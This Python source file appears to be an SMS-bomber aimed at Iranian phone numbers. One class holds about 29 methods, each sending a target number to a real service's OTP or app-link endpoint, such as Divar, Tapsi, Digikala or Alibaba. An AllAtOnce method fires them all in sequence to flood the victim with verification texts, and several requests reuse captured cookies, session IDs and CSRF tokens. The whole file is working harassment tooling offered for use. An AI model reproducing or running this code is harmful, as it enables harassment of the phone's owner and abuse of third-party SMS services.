# Github: https://github.com/ibehii
# Telegram: https://T.me/BZHNAM
# e-mail: Behii@tutanota.com
# ____________________________________________

# ======== # Import part # ======== #  
from lib import Headers
from time import sleep
try:
    from requests import post, get, Response
    from colorama import Fore
except ImportError:
    exit('Some required module are missing.\nPlease run "path pip install -r requirements.txt" command on your terminal.')

# ====== # For sites that only send code to iranian number # ====== #
class IranianSMS:
    def __init__(self, PhoneNumber: str) -> None:
        self.PhoneNumber: str = PhoneNumber
        
    def divar(self) -> bool:
        divar_URL: str = r"https://api.divar.ir/v5/auth/authenticate"
        
        try:
            result: Response = post(divar_URL, headers=Headers.divar_header, json={"phone":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def tapsi_passenger(self) -> bool:
        tapsi_passenger_login_URL: str = r"https://accounts-api.tapsi.ir/api/v1/sso-user/auth"
        cookies = {'__arcsco': '6bb021ad4353286b466629402d8c68a0',}
        json_data = {
        'session_id': 'e78d71e6-6533-4dd6-9e15-352aba68b36e--a3b71158-c72b-47a8-8253-58f1d1f2fc2e',
        'selected_step_key': 'PROMPT_FOR_SMS_CODE',
        'phone_number': self.PhoneNumber,}
        try:
            result: Response = post(tapsi_passenger_login_URL, headers=Headers.tapsi_passenger_login, cookies=cookies, json=json_data )
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def tapsi_biker(self) -> bool:
        tapsi_biker_URL: str = r"https://tap33.me/api/v2/user"
        
        try:
            result: Response = post(tapsi_biker_URL, headers=Headers.tapsi_biker_header, json={"credential":{"phoneNumber": self.PhoneNumber, "role":"BIKER"}})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def tapsi_driver(self) -> bool:
        tapsi_driver_URL = r"https://api.tapsi.ir/api/v2.2/user"

        try:
            result: Response = post(tapsi_driver_URL, headers=Headers.tapsi_driver_header, json={"credential":{"phoneNumber":self.PhoneNumber, "role":"DRIVER"},"otpOption":"SMS"})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def trob(self) -> bool:
        trob_URL: str = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={self.PhoneNumber}"
        
        try:
            result: Response = get(trob_URL, headers=Headers.trob_header)
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def sheypoor (self) -> bool:
        sheypoor_URL: str = r"https://www.sheypoor.com/api/v10.0.0/auth/send"
        
        try:
            result: Response = post(sheypoor_URL, headers=Headers.sheypoor_header, json={"username":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def sheypoor_app_link(self) -> bool:
        sheypoor_app_link_URL: str = r"https://www.sheypoor.com/api/web/download/send-notification"

        try:
            result: Response = post(sheypoor_app_link_URL, headers=Headers.sheypoor_app_link, data={"mobile":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def okcs(self) -> bool:
        okcs_URL: str = r"https://okcs.com/users/mobilelogin"
        
        try:
            result: Response = post(okcs_URL, headers=Headers.okcs_header, data={"mobile":self.PhoneNumber, "url":"https%3A%2F%2Fokcs.com"})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def alibaba(self) -> bool:
        alibaba_URL: str = r"https://ws.alibaba.ir/api/v3/account/mobile/otp"
        
        try:
            result: Response = post(alibaba_URL, headers=Headers.alibaba_header, json={"phoneNumber":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def oketab(self) -> bool:
        oketab_URL: str = f"https://www.oketab.com/index.php?login&rotp=true&mb={self.PhoneNumber}"
        
        try:
            result: Response = post(oketab_URL, headers=Headers.oketab)
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def GapFilm(self) -> bool:
        GapFilm_URL: str = r"https://core.gapfilm.ir/api/v3.1/Account/Login"

        try:
            result: Response = post(GapFilm_URL, headers=Headers.GapFilm_header, json={"Type":3,"Username":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def FilmNet(self) -> bool:
        FilmNet_URL: str = f"https://tv.filmnet.ir/api-v2/access-token/users/{self.PhoneNumber}/otp"
        try:
            result: Response = get(FilmNet_URL, headers=Headers.filmnet_header)
            if(result.status_code > 300):
                raise ConnectionError       
        except:
            return False
        else:
            return True
        
    def DrDr(self) -> bool:
        DrDr_URL: str = r"https://drdr.ir/api/v3/auth/login/mobile/init"
        
        try:
            result: Response = post(DrDr_URL, headers=Headers.DrDr_header, json={"mobile":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def itoll_app_link(self) -> bool:
        itoll_app_link_URL: str = r"https://app.itoll.com/api/v1/send-application-link"
        
        try:
            result: Response = post(itoll_app_link_URL, headers=Headers.itoll_app_link_header, json={"mobile":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def anar360(self) -> bool:
        anar360_URL: str = r"https://anar360.com/api/_/auth/check"
        
        try:
            result: Response = post(anar360_URL, headers=Headers.anar360_header, json={"mobile":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def azki(self) -> bool:
        azki_URL: str = r"https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/"
        
        try:
            result: Response = post(azki_URL, headers=Headers.azki_header, json={"phoneNumber":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def Nashr_olgoo(self) -> bool:
        Nashr_olgoo_URL: str = f"https://www.olgoobooks.ir/signupStudents/"

        data = {
    'contactInfo[mobile]': self.PhoneNumber,
    'contactInfo[agreementAccepted]': '1',
    'contactInfo[message]': '',
    'contactInfo[eduFieldId]': '1',
    'contactInfo[eduLevelId]': '17',
    'contactInfo[securityCode]': '3854',
    'submit_register': [
        'ارسال کد تایید','1',],}
        cookies = {'PHPSESSID': 'pq0h26ma4h49jq2qo0i98afnfo',}
        
        try:
            result: Response = post(Nashr_olgoo_URL, headers=Headers.Nashr_olgoo_header, cookies=cookies, data=data)
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def banimode(self) -> bool:
        banimode_URL: str = r"https://mobapi.banimode.com/api/v2/auth/request"
        
        try:
            result: Response = post(banimode_URL, headers=Headers.banimode_header, json={"phone":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def lendo(self) -> bool:
        lendo_URL: str = r"https://api.lendoco.ir/api/customer/auth/send-otp"
        
        try:
            result: Response = post(lendo_URL, headers=Headers.lendo_header, json={"mobile":self.PhoneNumber})
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True

    def basalam(self) -> bool:
        basalam_URL: str = r"https://auth.basalam.com/otp-request"
        
        try:
            result: Response = post(basalam_URL, headers=Headers.basalam_header, json={"mobile": self.PhoneNumber,"client_id":11} ) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def drsaina(self) -> bool:
        basalam_URL: str = f"https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber={self.PhoneNumber}"
        
        try:
            result: Response = get(basalam_URL, headers=Headers.drsaina_header) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def see5(self) -> bool:
        see5_URL: str = r"https://crm.see5.net/api_ajax/sendotp.php"
        
        try:
            result: Response = post(see5_URL, headers=Headers.see5_header, data=f"mobile={self.PhoneNumber}&action=sendsms&mcaptcha=764515" ) 

            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True

    def bimito(self) -> bool:
        bimito_URL: str = r"https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/"
        
        try:
            result: Response = post(bimito_URL, headers=Headers.bimito_header, json={"phoneNumber":self.PhoneNumber}) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def sibirani(self) -> bool:
        sibirani_URL: str = r"https://sandbox.sibirani.com/api/v1/user/invite"
        
        try:
            result: Response = post(sibirani_URL, headers=Headers.sibirani_header, json={"username":self.PhoneNumber}) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    def hamrah_mechanic(self) -> bool:
        hamrah_mechanic_URL: str = r"https://www.hamrah-mechanic.com/api/v1/membership/otp"
        
        try:
            result: Response = post(hamrah_mechanic_URL, headers=Headers.hamrah_mechanic_header, json={"PhoneNumber":self.PhoneNumber,"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/contactus/","referrer":"https://www.google.com/"}) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True 

    def varzesh3(self) -> bool:
        varzesh3_URL: str = r"https://sso.varzesh3.com/account/login"
        
        params = {
    'ReturnUrl': '/connect/authorize/callback?client_id=0D996589651C4235B7D40837E8C1DBC2F60410B2C9304298B568&redirect_uri=https%3A%2F%2Fwww.varzesh3.com%2Foidc%2Fcallback&response_type=code&scope=openid%20profile%20offline_access%20videos.api%20comments.api%20profile.api%20world-cup.prediction.api%20engagement.api%20notification.api%20pishbini.api&state=699e3ede1b124f24b353b90663dc3a58&code_challenge=7IoMY0nO9YgXzdCItZjfVKvslbvnin7F7ZnUwOR7HvY&code_challenge_method=S256&response_mode=query',
}
        cookies = {
    '.raft': 'CfDJ8K3TtALnqMtNjlXXQOu7VBHUYoWz4cWPHNGl_6-BJi5LPGoIBLD6iYlBZ1L1pwC4zg3NuaZlgev-SAl2W8E3tZmltisr_Fq5sQVBIR0cz75Hrqidf_vOKq6R16cCynyX0schy2sqo0uOgDwUCP-pWPg',
}
        data = {
    'ReturnUrl': '/connect/authorize/callback?client_id=0D996589651C4235B7D40837E8C1DBC2F60410B2C9304298B568&redirect_uri=https%3A%2F%2Fwww.varzesh3.com%2Foidc%2Fcallback&response_type=code&scope=openid%20profile%20offline_access%20videos.api%20comments.api%20profile.api%20world-cup.prediction.api%20engagement.api%20notification.api%20pishbini.api&state=699e3ede1b124f24b353b90663dc3a58&code_challenge=7IoMY0nO9YgXzdCItZjfVKvslbvnin7F7ZnUwOR7HvY&code_challenge_method=S256&response_mode=query',
    'PhoneNumber': self.PhoneNumber[1:],
    'Username': '98' + self.PhoneNumber[1:],
    'button': 'login',
    '__RequestVerificationToken': 'CfDJ8K3TtALnqMtNjlXXQOu7VBGXgRS6-tcTLNqZTWk_u1TEnaXB8bOk6NS4xtoOOc2Ptyv1Ww3Mdw5uWAgFZJsUa2NM0hydzQP8RmW3MScL4Zjj5x30oOEmL4Ok4WcMbl-TRVFQQgy7D4GG8cWI_CkYQgk',
}   
        try:
            result: Response = post(varzesh3_URL, headers=Headers.varzesh3_header, data=data, cookies=cookies, params=params) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True 
        
    def digikala(self) -> bool:
        digikala_URL: str = r"https://api.digikala.com/v1/user/authenticate/"
        cookies = {
    '_sp_id.13cb': 'ea35d45f-b735-43cb-86fb-a3e9725a68af.1720376938.1.1720377053..be86ef53-bc7b-48f7-a4d5-f7bc412ec0ac..a985481f-0e48-4c12-bebc-3a893a830130.1720376937683.15',
    'tracker_glob_new': 'aRyzJy2',
    'TS01c77ebf': '0102310591a9f7df94c8dd03aea8c1a0d91424373571a0a51f5e2ee0cc4ee4a7537fa70ca029ed2b1de9d2cde2259ed90e63cd94fc1b73141733ea5a95427182d604572bd4',
    'TS01b6ea4d': '0102310591d3e4be1223e5221fc4b1e87580c76e4e71a0a51f5e2ee0cc4ee4a7537fa70ca04ccda64b149c72d81f530b403b126a5fd9e8cb405f95a78f010093b88ac08cb006af70c373ba42115e7ae1a1981b13c8',
    'ab_test_experiments': '%5B%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22f0fd80107233fa604679779d7e121710%22%2C%2237136fdc21e0b782211ccac8c2d7be63%22%5D',
}
        json_data = {
    'backUrl': '/',
    'username': self.PhoneNumber,
    'otp_call': False,
}   
        try:
            result: Response = post(digikala_URL, headers=Headers.digikala_headers, json=json_data, cookies=cookies) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
    
    
    def telewebion(self) -> bool:
        telewebion_URL: str = r"https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
        
        json_data = {
    'code': '98',
    'phone': self.PhoneNumber[1:],
    'smsStatus': 'default',
}   
        try:
            result: Response = post(telewebion_URL, headers=Headers.telewebion_headers, json=json_data) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True
        
    def pindo(self) -> bool:
        pindo_URL: str = r"https://api.pindo.ir/v1/user/login-register/"
        
        try:
            result: Response = post(pindo_URL, headers=Headers.pindo_header, json={'phone': self.PhoneNumber}) 
            if(result.status_code > 300):
                raise ConnectionError
        except:
            return False
        else:
            return True  
        
    def AllAtOnce(self) -> None:
                
        if (self.azki()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through azki Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through azki!' + Fore.RESET)
            
        sleep(1.666)
        if (self.alibaba()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through alibaba Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through alibaba!' + Fore.RESET)
            
        sleep(1.666)
        if (self.anar360()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through anar360 Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through anar360!' + Fore.RESET)
            
        sleep(1.666)
        if (self.divar()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through divar Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through divar!' + Fore.RESET)
            
        sleep(1.666)
        if (self.DrDr()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through DrDr Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through DrDr!' + Fore.RESET)
            
        sleep(1.666)
        if (self.FilmNet()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through FilmNet Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through FilmNet!' + Fore.RESET)
            
        sleep(1.666)
        if (self.GapFilm()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through GapFilm Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through GapFilm!' + Fore.RESET)
            
        sleep(1.666)
        if (self.itoll_app_link()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Download link sent through itoll Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send download link through itoll!' + Fore.RESET)
            
        sleep(1.666)
        if (self.okcs()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through okcs Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through okcs!' + Fore.RESET)
        
        sleep(1.666)
        if (self.oketab()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through oketab Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through oketab!' + Fore.RESET)
        
        sleep(1.666)
        if (self.sheypoor()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through sheypoor Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through sheypoor!' + Fore.RESET)

        sleep(1.666)
        if (self.sheypoor_app_link()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Download link sent through sheypoor Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send download link through sheypoor!' + Fore.RESET)
            
        sleep(1.666)
        if (self.tapsi_driver()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through "tapsi for driver" Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through "tapsi for driver"!' + Fore.RESET)

        sleep(1.666)

        if (self.tapsi_passenger()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through "tapsi for passenger" Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through "tapsi for passenger"!' + Fore.RESET)
            
        sleep(1.666)

        if (self.trob()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through trob Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through trob!' + Fore.RESET)
            
        sleep(1.666)
        if (self.tapsi_biker()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through "tapsi for biker" Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through "tapsi for biker"!' + Fore.RESET)
            
        sleep(1.666)
        if (self.Nashr_olgoo()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through Nashr olgoo Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through Nashr olgoo!' + Fore.RESET)
            
        sleep(1.666)
        if (self.banimode()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through banimode Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through banimode!' + Fore.RESET)
        
        sleep(1.666)
        if (self.lendo()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through lendo Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through lendo!' + Fore.RESET)
        
        sleep(1.666)

        if (self.basalam()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through basalam Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through basalam!' + Fore.RESET)
        
        sleep(1.666)
        if (self.drsaina()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through drsaina Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through drsaina!' + Fore.RESET)
        
        sleep(1.666)
        if (self.see5()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through see5 Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through see5!' + Fore.RESET)
        
        sleep(1.666)
        if (self.bimito()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through bimito Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through bimito!' + Fore.RESET)
        
        sleep(1.666)
        if (self.sibirani()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through sibirani Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through sibirani!' + Fore.RESET)
        
        sleep(1.666)

        if (self.hamrah_mechanic()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through hamrah mechanic Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through hamrah mechanic!' + Fore.RESET)

        sleep(1.666)

        if (self.varzesh3()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through varzesh3 Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through varzesh3!' + Fore.RESET)
        
        sleep(1.666)

        if (self.pindo()):
            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + 'Verification code sent through pindo Successfully' + Fore.RESET)
        else:
            print(Fore.RED + '[-] - '  + 'Couldn\'t send Verification code through pindo!' + Fore.RESET)
        